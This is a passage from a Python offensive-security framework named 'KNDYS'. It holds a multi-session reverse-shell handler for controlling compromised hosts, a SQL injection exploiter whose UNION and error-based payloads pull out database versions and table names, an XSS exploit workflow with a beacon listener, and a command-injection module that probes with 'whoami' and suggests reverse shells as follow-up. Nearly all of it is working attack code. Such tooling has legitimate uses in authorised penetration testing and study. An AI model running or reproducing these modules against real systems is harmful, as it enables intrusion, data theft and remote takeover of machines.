                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            session.last_seen = time.time()
                            buffer += chunk
                            if len(buffer) > 0:
                                decoded = buffer.decode(encoding, errors='ignore')
                                buffer = b''
                                session.buffer.append(decoded)
                                self._write_transcript(session, decoded)
                                print(f"\n{Fore.BLUE}[SESSION {session.sid}] {decoded}{Style.RESET_ALL}")
                        except socket.timeout:
                            if self.profile['keepalive_interval'] and (time.time() - session.last_seen) > self.profile['keepalive_interval']:
                                try:
                                    sock.sendall(self.profile['keepalive_payload'] + b'\n')
                                    session.last_seen = time.time()
                                except Exception:
                                    break
                            continue
                        except Exception as exc:
                            print(f"{Fore.RED}[!] Session {session.sid} error: {exc}{Style.RESET_ALL}")
                            break
                finally:
                    session.active = False
                    try:
                        sock.close()
                    except Exception:
                        pass
                    print(f"{Fore.YELLOW}[*] Session {session.sid} closed{Style.RESET_ALL}")

            def _write_transcript(self, session: HandlerSession, data: str):
                if not (self.profile['record_sessions'] and session.transcript_path):
                    return
                try:
                    with open(session.transcript_path, 'a', encoding='utf-8') as fh:
                        fh.write(data)
                        if not data.endswith('\n'):
                            fh.write('\n')
                except Exception as exc:
                    print(f"{Fore.YELLOW}[!] Transcript write failed for session {session.sid}: {exc}{Style.RESET_ALL}")

            def _monitor_sessions(self):
                while not self.stop_event.is_set():
                    time.sleep(5)
                    now = time.time()
                    idle_limit = self.profile['idle_timeout']
                    with self.session_lock:
                        sessions = list(self.sessions.values())
                    for session in sessions:
                        if not session.active:
                            continue
                        if idle_limit and (now - session.last_seen) > idle_limit:
                            print(f"{Fore.YELLOW}[!] Session {session.sid} idle for > {idle_limit}s; closing{Style.RESET_ALL}")
                            self._close_session(session.sid)

            def _command_loop(self):
                help_lines = [
                    "sessions → list active sessions",
                    "interact <id> → attach to session",
                    "read <id> → dump last buffered output",
                    "broadcast <cmd> → send command to all sessions",
                    "kill <id> → terminate session",
                    "stats → show handler metrics",
                    "help → show this help",
                    "exit → stop handler"
                ]
                print(f"{Fore.CYAN}Available handler commands:{Style.RESET_ALL}")
                for line in help_lines:
                    print(f" {line}")
                while not self.stop_event.is_set():
                    try:
                        cmd = input(f"{Fore.CYAN}handler{Fore.RED}►{Style.RESET_ALL} ").strip()
                    except (KeyboardInterrupt, EOFError):
                        print()
                        break
                    if not cmd:
                        continue
                    if cmd in {'exit', 'quit'}:
                        break
                    if cmd == 'help':
                        for line in help_lines:
                            print(f" {line}")
                    elif cmd == 'sessions':
                        self._list_sessions()
                    elif cmd.startswith('interact '):
                        self._interactive_shell(cmd.split(maxsplit=1)[1])
                    elif cmd.startswith('read '):
                        self._read_buffer(cmd.split(maxsplit=1)[1])
                    elif cmd.startswith('broadcast '):
                        self._broadcast(cmd.split(maxsplit=1)[1])
                    elif cmd.startswith('kill '):
                        self._close_session(cmd.split(maxsplit=1)[1])
                    elif cmd == 'stats':
                        self._stats()
                    else:
                        print(f"{Fore.YELLOW}[!] Unknown command: {cmd}{Style.RESET_ALL}")

            def _interactive_shell(self, arg):
                try:
                    sid = int(arg)
                except ValueError:
                    print(f"{Fore.RED}[!] Invalid session id: {arg}{Style.RESET_ALL}")
                    return
                session = self.sessions.get(sid)
                if not session or not session.active:
                    print(f"{Fore.YELLOW}[!] Session {sid} not available{Style.RESET_ALL}")
                    return
                print(f"{Fore.GREEN}[*] Interactive mode for session {sid}. Type 'back' to return.{Style.RESET_ALL}")
                encoding = self.profile['encoding']
                while session.active and not self.stop_event.is_set():
                    try:
                        cmd = input(f"session-{sid}> ")
                    except KeyboardInterrupt:
                        print()
                        continue
                    if cmd.strip().lower() in {'back', 'exit', 'quit'}:
                        break
                    self._send_command(session, cmd, encoding)

            def _send_command(self, session: HandlerSession, cmd: str, encoding: str):
                try:
                    session.sock.sendall(cmd.encode(encoding, errors='ignore') + b'\n')
                except Exception as exc:
                    print(f"{Fore.RED}[!] Failed to send command to session {session.sid}: {exc}{Style.RESET_ALL}")

            def _broadcast(self, cmd: str):
                with self.session_lock:
                    sessions = [s for s in self.sessions.values() if s.active]
                for session in sessions:
                    self._send_command(session, cmd, self.profile['encoding'])
                print(f"{Fore.CYAN}[*] Broadcast '{cmd}' to {len(sessions)} session(s){Style.RESET_ALL}")

            def _read_buffer(self, arg):
                try:
                    sid = int(arg)
                except ValueError:
                    print(f"{Fore.RED}[!] Invalid session id{Style.RESET_ALL}")
                    return
                session = self.sessions.get(sid)
                if not session:
                    print(f"{Fore.YELLOW}[!] Session {sid} not found{Style.RESET_ALL}")
                    return
                if not session.buffer:
                    print(f"{Fore.YELLOW}[*] Session {sid} has no buffered output yet{Style.RESET_ALL}")
                    return
                print(f"{Fore.CYAN}--- Session {sid} buffer ---{Style.RESET_ALL}")
                for entry in session.buffer:
                    print(entry.rstrip())
                print(f"{Fore.CYAN}--- End buffer ---{Style.RESET_ALL}")

            def _list_sessions(self):
                with self.session_lock:
                    sessions = list(self.sessions.values())
                if not sessions:
                    print(f"{Fore.YELLOW}[*] No active sessions{Style.RESET_ALL}")
                    return
                print(f"{Fore.CYAN}{'ID':<5} {'Address':<21} {'Transport':<10} {'Alive':<6} {'Last Seen'}{Style.RESET_ALL}")
                for session in sessions:
                    alive = 'yes' if session.active else 'no'
                    last = datetime.fromtimestamp(session.last_seen).strftime('%H:%M:%S')
                    print(f"{session.sid:<5} {session.address[0]}:{session.address[1]:<15} {session.transport:<10} {alive:<6} {last}")

            def _stats(self):
                with self.session_lock:
                    total = len(self.sessions)
                    active = len([s for s in self.sessions.values() if s.active])
                print(f"{Fore.CYAN}[*] Total sessions ever : {total}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[*] Active sessions : {active}{Style.RESET_ALL}")

            def _close_session(self, arg):
                try:
                    sid = int(arg)
                except ValueError:
                    print(f"{Fore.RED}[!] Invalid session id{Style.RESET_ALL}")
                    return
                session = self.sessions.get(sid)
                if not session:
                    print(f"{Fore.YELLOW}[*] Session {sid} not found{Style.RESET_ALL}")
                    return
                session.active = False
                try:
                    session.sock.close()
                except Exception:
                    pass
                print(f"{Fore.YELLOW}[*] Session {sid} terminated{Style.RESET_ALL}")

            def _session_count(self):
                with self.session_lock:
                    return len([s for s in self.sessions.values() if s.active])

            def _shutdown(self):
                if self.listener_socket:
                    try:
                        self.listener_socket.close()
                    except Exception:
                        pass
                if self.http_server:
                    try:
                        self.http_server.server_close()
                    except Exception:
                        pass
                for session in list(self.sessions.values()):
                    self._close_session(session.sid)
                for thread in self.server_threads:
                    thread.join(timeout=1)
                print(f"{Fore.YELLOW}[*] Multi/handler shutdown complete{Style.RESET_ALL}")

        opts = self.module_options
        lhost = opts.get('lhost', self.config['lhost']) or self.get_local_ip()
        lport = self._safe_int(opts.get('lport'), 4444, 1, 65535)
        transports_raw = opts.get('transport', 'tcp') or 'tcp'
        transports = [t.strip().lower() for t in transports_raw.split(',') if t.strip()]
        if not transports:
            transports = ['tcp']
        stage_port_value = opts.get('stage_port')
        if stage_port_value in (None, '', '0'):
            stage_port = 0
        else:
            stage_port = self._safe_int(stage_port_value, lport + 1, 1, 65535)
        profile = {
            'lhost': lhost,
            'lport': lport,
            'transports': transports,
            'payload': opts.get('payload', 'raw_reverse_shell'),
            'banner': opts.get('banner', 'KNDYS multi-handler ready'),
            'auto_command': opts.get('auto_command', ''),
            'stage_payload': opts.get('stage_payload', ''),
            'stage_port': stage_port,
            'stage_mime': opts.get('stage_mime', 'application/octet-stream') or 'application/octet-stream',
            'max_sessions': self._safe_int(opts.get('max_sessions'), 12, 1, 256),
            'idle_timeout': self._safe_int(opts.get('idle_timeout'), 900, 30, 3600),
            'record_sessions': truthy(opts.get('record_sessions', 'true')), 
            'session_log': opts.get('session_log', 'handler_sessions') or 'handler_sessions',
            'encoding': opts.get('encoding', 'utf-8') or 'utf-8',
            'keepalive_interval': float(opts.get('keepalive_interval', 45) or 45),
            'keepalive_payload': (opts.get('keepalive_payload', 'PING') or 'PING').encode('utf-8'),
            'http_logging': truthy(opts.get('http_logging', 'false')),
            'ssl_cert': opts.get('ssl_cert', ''),
            'ssl_key': opts.get('ssl_key', ''),
            'backlog': self._safe_int(opts.get('backlog'), 50, 1, 512),
            'command_timeout': float(opts.get('command_timeout', 6) or 6)
        }
        engine = MultiHandlerEngine(profile, self)
        engine.start()
    
    def handle_reverse_shell(self, client, addr):
        """Handle reverse shell connection"""
        try:
            print(f"{Fore.GREEN}[*] Shell session opened with {addr[0]}{Style.RESET_ALL}")
            
            # Send welcome message
            welcome = b"\nKNDYS Framework - Reverse Shell Session\n"
            client.send(welcome)
            
            # Interactive shell
            while True:
                try:
                    # Show prompt
                    prompt = f"{Fore.CYAN}kndys-shell{Fore.RED}@{addr[0]}{Fore.CYAN}$ {Style.RESET_ALL}"
                    cmd = input(prompt)
                    
                    if cmd.lower() in ['exit', 'quit']:
                        client.send(b'exit\n')
                        break
                    
                    client.send(cmd.encode() + b'\n')
                    
                    # Receive output
                    client.settimeout(0.5)
                    output = b''
                    try:
                        while True:
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                    except socket.timeout:
                        pass
                    
                    if output:
                        print(output.decode('utf-8', errors='ignore'))
                        
                except KeyboardInterrupt:
                    client.send(b'\x03') # Ctrl+C
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                    break
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Shell error: {str(e)}{Style.RESET_ALL}")
        finally:
            client.close()
            print(f"{Fore.YELLOW}[*] Shell session closed{Style.RESET_ALL}")
    
    def _resolve_sqli_profile(self):
        opts = self.module_options
        url = (opts.get('url') or '').strip()
        if not url:
            print(f"{Fore.RED}[!] SQLi module requires a target URL{Style.RESET_ALL}")
            return None
        method = (opts.get('method', 'auto') or 'auto').lower()
        parameters = (opts.get('parameters', 'auto') or 'auto').strip() or 'auto'
        injection_location = (opts.get('injection_location', 'auto') or 'auto').lower()
        if injection_location not in {'auto', 'query', 'body', 'both'}:
            injection_location = 'auto'
        technique_blob = opts.get('techniques') or opts.get('technique') or 'boolean,union,error,time'
        techniques = [t.strip() for t in re.split(r'[\s,]+', technique_blob) if t.strip()]
        if not techniques:
            techniques = ['boolean']
        max_depth = self._safe_int(opts.get('max_depth'), 6, 1, 24)
        max_payloads = self._safe_int(opts.get('max_payloads'), 12, 1, 64)
        max_total_payloads = self._safe_int(opts.get('max_total_payloads'), 120, 1, 512)
        threads = self._safe_int(opts.get('threads'), 8, 1, 64)
        timeout = self._safe_float(opts.get('timeout'), 8.0, 2.0, 60.0)
        throttle = self._safe_float(opts.get('throttle'), 0.0, 0.0, 5.0)
        verify_ssl = self._parse_bool_option(opts.get('verify_ssl', 'false'), False)
        length_threshold = self._safe_int(opts.get('length_threshold'), 120, 20, 5000)
        delay_threshold = self._safe_float(opts.get('delay_threshold'), 3.0, 0.5, 20.0)
        headers = {
            'User-Agent': self.config.get('user_agent', 'KNDYS-SQLI'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        headers.update(self._build_header_map(opts.get('custom_headers', '')))
        cookies = self._build_cookie_map(opts.get('cookies', ''))
        proxies = self._build_proxy_map(opts.get('proxies', ''))
        profile = {
            'url': url,
            'method': method,
            'parameters': parameters,
            'injection_location': injection_location,
            'techniques': techniques,
            'max_depth': max_depth,
            'max_payloads': max_payloads,
            'max_total_payloads': max_total_payloads,
            'threads': threads,
            'timeout': timeout,
            'throttle': throttle,
            'verify_ssl': verify_ssl,
            'length_threshold': length_threshold,
            'delay_threshold': delay_threshold,
            'headers': headers,
            'cookies': cookies,
            'proxies': proxies,
            'body': opts.get('body', ''),
        }
        return profile
    def run_sql_injection(self):
        """SQL injection exploitation"""
        profile = self._resolve_sqli_profile()
        if not profile:
            return

        print(f"{Fore.CYAN}[*] Target: {profile['url']} | Method: {profile['method'].upper()} | Payload plan cap: {profile['max_total_payloads']}{Style.RESET_ALL}")
        scanner = AdvancedSQLiScanner(profile, self)
        scanner.execute()
    
    def exploit_union_sqli(self, url):
        """Exploit UNION-based SQL injection"""
        print(f"{Fore.YELLOW}[*] Attempting UNION-based exploitation{Style.RESET_ALL}")
        
        # First, find number of columns
        print(f"{Fore.BLUE}[*] Finding number of columns...{Style.RESET_ALL}")
        
        for i in range(1, 10):
            payload = f"' ORDER BY {i}--"
            test_url = url.replace('=', f"={payload}")
            
            try:
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for error
                if 'error' in response.text.lower() or 'order by' in response.text.lower():
                    num_columns = i - 1
                    print(f"{Fore.GREEN}[+] Number of columns: {num_columns}{Style.RESET_ALL}")
                    break
            except:

                continue
        
        # Try to extract database version
        print(f"{Fore.BLUE}[*] Extracting database information...{Style.RESET_ALL}")
        
        version_payloads = [
            f"' UNION SELECT @@version,{','.join(['NULL']*(num_columns-1))}--",
            f"' UNION SELECT version(),{','.join(['NULL']*(num_columns-1))}--",
            f"' UNION SELECT sqlite_version(),{','.join(['NULL']*(num_columns-1))}--"
        ]
        
        for payload in version_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Look for version string
                version_pattern = r'\d+\.\d+\.\d+'
                match = re.search(version_pattern, response.text)
                if match:
                    print(f"{Fore.GREEN}[+] Database version: {match.group()}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        # Try to extract table names
        print(f"{Fore.BLUE}[*] Attempting to extract table names...{Style.RESET_ALL}")
        
        table_payloads = [
            f"' UNION SELECT table_name,{','.join(['NULL']*(num_columns-1))} FROM information_schema.tables--",
            f"' UNION SELECT name,{','.join(['NULL']*(num_columns-1))} FROM sqlite_master WHERE type='table'--"
        ]
        
        for payload in table_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Look for common table names
                common_tables = ['users', 'admin', 'customer', 'product', 'order']
                for table in common_tables:
                    if table in response.text.lower():
                        print(f"{Fore.GREEN}[+] Found table: {table}{Style.RESET_ALL}")
            except:
                continue
        
        print(f"\n{Fore.CYAN}[*] SQL injection exploitation completed{Style.RESET_ALL}")
    
    def exploit_error_sqli(self, url):
        """Exploit error-based SQL injection"""
        print(f"{Fore.YELLOW}[*] Attempting error-based exploitation{Style.RESET_ALL}")
        
        # Try to extract database version through errors
        error_payloads = [
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=CONVERT(int, @@version)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, @@version))--"
        ]
        
        for payload in error_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Extract version from error message
                version_pattern = r'\d+\.\d+\.\d+'
                match = re.search(version_pattern, response.text)
                if match:
                    print(f"{Fore.GREEN}[+] Database version (from error): {match.group()}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        print(f"\n{Fore.CYAN}[*] Error-based exploitation completed{Style.RESET_ALL}")
    
    def _resolve_xss_exploit_profile(self):
        opts = self.module_options
        url = (opts.get('url') or '').strip()
        if not url:
            print(f"{Fore.RED}[!] XSS exploit module requires a target URL{Style.RESET_ALL}")
            return None
        method = (opts.get('method', 'auto') or 'auto').lower()
        parameters = (opts.get('parameters', 'auto') or 'auto').strip() or 'auto'
        injection_location = (opts.get('injection_location', 'auto') or 'auto').lower()
        if injection_location not in {'auto', 'query', 'body', 'both'}:
            injection_location = 'auto'
        payload_profile = (opts.get('payload_profile', 'balanced') or 'balanced').lower()
        custom_payload = opts.get('custom_payload', '')
        encoder = (opts.get('encoder', 'none') or 'none').lower()
        threads = self._safe_int(opts.get('threads'), 6, 1, 64)
        max_payloads = self._safe_int(opts.get('max_payloads'), 12, 1, 64)
        max_total_payloads = self._safe_int(opts.get('max_total_payloads'), 60, 1, 512)
        timeout = self._safe_float(opts.get('timeout'), 8.0, 2.0, 60.0)
        throttle = self._safe_float(opts.get('throttle'), 0.0, 0.0, 5.0)
        verify_ssl = self._parse_bool_option(opts.get('verify_ssl', 'false'), False)
        auto_verify = self._parse_bool_option(opts.get('auto_verify', 'true'), True)
        start_listener = self._parse_bool_option(opts.get('start_listener', 'false'), False)
        listener_host = opts.get('listener_host', self.config.get('lhost', '127.0.0.1')) or self.config.get('lhost', '127.0.0.1')
        listener_port = self._safe_int(opts.get('listener_port'), 9090, 1024, 65535)
        listener_token = opts.get('listener_token', '').strip()
        beacon_endpoint = (opts.get('beacon_endpoint', '') or '').strip()
        if start_listener and not beacon_endpoint:
            beacon_endpoint = f"http://{listener_host}:{listener_port}/beacon"
        rate_limit_value = float(opts.get('rate_limit', '0') or 0)
        rate_limiter = None
        if rate_limit_value > 0:
            rate_limiter = RateLimiter(max_requests=max(1, int(rate_limit_value)), time_window=1)
        headers = {
            'User-Agent': self.config.get('user_agent', 'KNDYS-XSS'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        headers.update(self._build_header_map(opts.get('custom_headers', '')))
        cookies = self._build_cookie_map(opts.get('cookies', ''))
        proxies = self._build_proxy_map(opts.get('proxies', ''))
        profile = {
            'url': url,
            'method': method,
            'parameters': parameters,
            'body': opts.get('body', ''),
            'injection_location': injection_location,
            'payload_profile': payload_profile,
            'custom_payload': custom_payload,
            'encoder': encoder,
            'threads': threads,
            'max_payloads': max_payloads,
            'max_total_payloads': max_total_payloads,
            'timeout': timeout,
            'throttle': throttle,
            'verify_ssl': verify_ssl,
            'auto_verify': auto_verify,
            'start_listener': start_listener,
            'listener_host': listener_host,
            'listener_port': listener_port,
            'listener_token': listener_token,
            'beacon_url': beacon_endpoint,
            'rate_limiter': rate_limiter,
            'headers': headers,
            'cookies': cookies,
            'proxies': proxies,
            'report_prefix': opts.get('report_prefix', 'xss_exploit') or 'xss_exploit'
        }
        return profile

    def run_xss_exploit(self):
        """Advanced XSS exploitation workflow"""
        profile = self._resolve_xss_exploit_profile()
        if not profile:
            return
        listener = None
        if profile['start_listener']:
            listener = XSSBeaconServer(profile['listener_host'], profile['listener_port'], profile['listener_token'], self.logger)
            if listener.start():
                print(f"{Fore.GREEN}[+] Beacon listener active on {profile['listener_host']}:{profile['listener_port']}{Style.RESET_ALL}")
                if profile['listener_token']:
                    print(f"{Fore.BLUE}ℹ Expecting token: {profile['listener_token']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Failed to start beacon listener; continuing without it{Style.RESET_ALL}")
                listener = None
        factory = XSSPayloadFactory()
        payloads = factory.generate(profile['payload_profile'], profile['max_payloads'], profile['custom_payload'], profile['beacon_url'])
        if not payloads:
            print(f"{Fore.RED}[!] No payloads available for the selected profile{Style.RESET_ALL}")
            if listener:
                listener.stop()
            return
        print(f"{Fore.CYAN}[*] Prepared {len(payloads)} payload(s) using the {profile['payload_profile']} profile{Style.RESET_ALL}")
        for payload in payloads[:5]:
            print(f" {Fore.YELLOW}{payload.name:<16}{Style.RESET_ALL} ctx={payload.context:<8} tags={','.join(payload.tags)}")
        findings = []
        errors = []
        duration = 0.0
        requests_tested = 0
        if profile['auto_verify']:
            print(f"{Fore.CYAN}[*] Launching automated verification with {profile['threads']} worker(s){Style.RESET_ALL}")
            verifier = XSSAutoVerifier(profile, payloads, self)
            auto_result = verifier.execute()
            findings = auto_result['findings']
            errors = auto_result['errors']
            duration = auto_result['duration']
            requests_tested = auto_result['requests']
        else:
            print(f"{Fore.YELLOW}[!] Auto-verification disabled; showing payloads only{Style.RESET_ALL}")
        beacon_events = listener.events if listener else []
        self._display_xss_results(payloads, findings, errors, duration, requests_tested, beacon_events)
        report_paths = self._export_xss_exploit_results(profile, payloads, findings, errors, duration, requests_tested, beacon_events)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] XSS exploit reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        if listener:
            listener.stop()

    def _display_xss_results(self, payloads, findings, errors, duration, requests_tested, beacon_events):
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}XSS EXPLOIT SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Payloads prepared : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
        if requests_tested:
            print(f"{Fore.WHITE} Requests attempted : {Fore.CYAN}{requests_tested}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings discovered: {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Errors logged : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
        if duration:
            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
        if findings:
            print(f"\n{Fore.GREEN}[+] Top Findings{Style.RESET_ALL}")
            for finding in findings[:5]:
                print(f" {Fore.YELLOW}{finding.severity:<6}{Style.RESET_ALL} param={finding.parameter} via {finding.payload_name} → {finding.reflection_type} context")
                print(f" Evidence: {finding.evidence[:80]}")
        if beacon_events:
            print(f"\n{Fore.GREEN}[+] Captured beacon events: {len(beacon_events)}{Style.RESET_ALL}")
            for event in beacon_events[:5]:
                token = event['query'].get('token', '')
                print(f" {event['source']} {time.strftime('%H:%M:%S', time.localtime(event['timestamp']))} token={token}")
        if errors:
            print(f"\n{Fore.YELLOW}[!] Errors / warnings{Style.RESET_ALL}")
            for entry in errors[:5]:
                print(f" - {entry.get('error')}")

    def _export_xss_exploit_results(self, profile, payloads, findings, errors, duration, requests_tested, beacon_events):
        timestamp = int(time.time())
        host = urlparse(profile['url']).netloc.replace(':', '_') or 'target'
        base_name = f"{profile['report_prefix']}_{host}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        data = {
            'target': profile['url'],
            'method': profile['method'],
            'payload_profile': profile['payload_profile'],
            'payloads': [payload.__dict__ for payload in payloads],
            'findings': [finding.__dict__ for finding in findings],
            'errors': errors,
            'duration': duration,
            'requests': requests_tested,
            'beacon_events': beacon_events
        }
        with open(json_path, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)
        with open(txt_path, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("KNDYS XSS EXPLOIT REPORT\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {profile['url']}\n")
            fh.write(f"Method: {profile['method']}\n")
            fh.write(f"Payload profile: {profile['payload_profile']}\n")
            fh.write(f"Payloads prepared: {len(payloads)}\n")
            fh.write(f"Requests attempted: {requests_tested}\n")
            fh.write(f"Findings: {len(findings)}\n")
            fh.write(f"Errors: {len(errors)}\n")
            fh.write(f"Duration: {duration:.2f}s\n\n")
            if findings:
                fh.write("Findings:\n")
                for finding in findings:
                    fh.write(f"- [{finding.severity}] param={finding.parameter} via {finding.payload_name}\n")
                    fh.write(f" Context: {finding.context} Reflection: {finding.reflection_type}\n")
                    fh.write(f" Evidence: {finding.evidence}\n")
                    fh.write(f" Payload: {finding.payload}\n\n")
            if beacon_events:
                fh.write("Beacon events:\n")
                for event in beacon_events:
                    fh.write(f"- {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(event['timestamp']))} {event['source']} {event['query']}\n")
            if errors:
                fh.write("\nErrors / Warnings:\n")
                for entry in errors:
                    fh.write(f"- {entry.get('error')}\n")
        return [json_path, txt_path]
    
    def _resolve_command_injection_profile(self):
        opts = self.module_options
        url = (opts.get('url') or '').strip()
        if not url:
            print(f"{Fore.RED}[!] Command injection module requires a URL{Style.RESET_ALL}")
            return None
        method = (opts.get('method', 'auto') or 'auto').strip().lower()
        if method not in {'get', 'post', 'auto'}:
            method = 'auto'
        parameters = (opts.get('parameters', 'auto') or 'auto').strip() or 'auto'
        body = opts.get('body', '') or ''
        injection_location = (opts.get('injection_location', 'auto') or 'auto').strip().lower()
        if injection_location not in {'auto', 'query', 'body', 'both'}:
            injection_location = 'auto'
        os_profile = (opts.get('os_profile') or opts.get('os') or 'auto').strip().lower()
        if os_profile not in {'linux', 'windows', 'auto'}:
            os_profile = 'auto'
        attack_modes = [mode.strip().lower() for mode in (opts.get('attack_modes', 'detect,blind') or 'detect').split(',') if mode.strip()]
        if not attack_modes:
            attack_modes = ['detect']
        confirm_command = (opts.get('confirm_command') or 'whoami').strip() or 'whoami'
        custom_payload = opts.get('custom_payload', '')
        encoder = (opts.get('encoder', 'none') or 'none').strip().lower()
        if encoder not in {'none', 'url', 'double-url', 'base64'}:
            encoder = 'none'
        max_payloads = self._safe_int(opts.get('max_payloads'), 10, 1, 64)
        max_total_payloads = self._safe_int(opts.get('max_total_payloads'), 60, 1, 512)
        threads = self._safe_int(opts.get('threads'), 4, 1, 32)
        timeout = self._safe_float(opts.get('timeout'), 8.0, 2.0, 60.0)
        throttle = self._safe_float(opts.get('throttle'), 0.0, 0.0, 5.0)
        blind_delay = self._safe_float(opts.get('blind_delay'), 5.0, 1.0, 30.0)
        verify_ssl = self._parse_bool_option(opts.get('verify_ssl', 'false'), False)
        indicators_raw = opts.get('response_indicators', 'uid=,gid=,root:,windows ip,volume in drive')
        indicators = [indicator.strip() for indicator in indicators_raw.split(',') if indicator.strip()]
        if not indicators:
            indicators = ['uid=', 'gid=', 'root:']
        success_regex = opts.get('success_regex', 'uid=|gid=|www-data|administrator|system32') or ''
        rate_limit_value = float(opts.get('rate_limit', '0') or 0)
        rate_limiter = None
        if rate_limit_value > 0:
            rate_limiter = RateLimiter(max_requests=max(1, int(rate_limit_value)), time_window=1)
        headers = {
            'User-Agent': self.config.get('user_agent', 'KNDYS-CMDI'),
            'Accept': '*/*'
        }
        headers.update(self._build_header_map(opts.get('custom_headers', '')))
        cookies = self._build_cookie_map(opts.get('cookies', ''))
        proxies = self._build_proxy_map(opts.get('proxies', ''))
        if os_profile == 'auto':
            # Primitive heuristic: assume Windows if confirm command mentions 'powershell' or 'dir'
            lowered = confirm_command.lower()
            os_profile = 'windows' if any(token in lowered for token in ['powershell', 'dir', 'cmd.exe']) else 'linux'
        profile = {
            'url': url,
            'method': method,
            'parameters': parameters,
            'body': body,
            'injection_location': injection_location,
            'os_profile': os_profile,
            'attack_modes': attack_modes,
            'confirm_command': confirm_command,
            'custom_payload': custom_payload,
            'encoder': encoder,
            'max_payloads': max_payloads,
            'max_total_payloads': max_total_payloads,
            'threads': threads,
            'timeout': timeout,
            'throttle': throttle,
            'blind_delay': blind_delay,
            'verify_ssl': verify_ssl,
            'indicators': indicators,
            'success_regex': success_regex,
            'rate_limiter': rate_limiter,
            'headers': headers,
            'cookies': cookies,
            'proxies': proxies,
            'report_prefix': opts.get('report_prefix', 'command_injection') or 'command_injection'
        }
        return profile

    def _display_command_injection_results(self, profile, findings, errors, duration, requests_planned):
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}COMMAND INJECTION SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['url']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} OS Profile : {Fore.CYAN}{profile['os_profile'].title()}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Parameters tested : {Fore.CYAN}{profile['parameters']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Attack modes : {Fore.CYAN}{', '.join(profile['attack_modes'])}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Requests scheduled: {Fore.CYAN}{requests_planned}{Style.RESET_ALL}")
        if duration:
            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
        if findings:
            print(f"\n{Fore.GREEN}[+] Confirmed findings{Style.RESET_ALL}")
            for finding in findings[:5]:
                print(f" {Fore.YELLOW}{finding.severity:<8}{Style.RESET_ALL} param={finding.parameter:<10} via {finding.payload_name:<16} ({finding.location})")
                print(f" Indicator: {finding.indicator} | Status {finding.status_code} | {finding.elapsed:.2f}s")
                print(f" Evidence : {finding.evidence[:90]}")
            shells = self._recommend_reverse_shells(profile['os_profile'])
            if shells:
                print(f"\n{Fore.CYAN}Recommended follow-up payloads:{Style.RESET_ALL}")
                for descriptor in shells:
                    print(f" - {descriptor}")
        else:
            print(f"\n{Fore.YELLOW}[*] No definitive command injection indicators observed{Style.RESET_ALL}")
        if errors:
            print(f"\n{Fore.YELLOW}[!] Errors / warnings{Style.RESET_ALL}")
            for entry in errors[:5]:
                print(f" - {entry.get('error')}")

    def _export_command_injection_results(self, profile, findings, errors, duration, requests_planned):
        timestamp = int(time.time())
        host = urlparse(profile['url']).netloc.replace(':', '_') or 'target'
        base_name = f"{profile['report_prefix']}_{host}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        data = {
            'profile': profile,
            'timestamp': timestamp,
            'duration': duration,
            'requests_planned': requests_planned,
            'findings': [finding.__dict__ for finding in findings],
            'errors': errors
        }
        with open(json_path, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)
        with open(txt_path, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("KNDYS COMMAND INJECTION REPORT\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {profile['url']}\n")
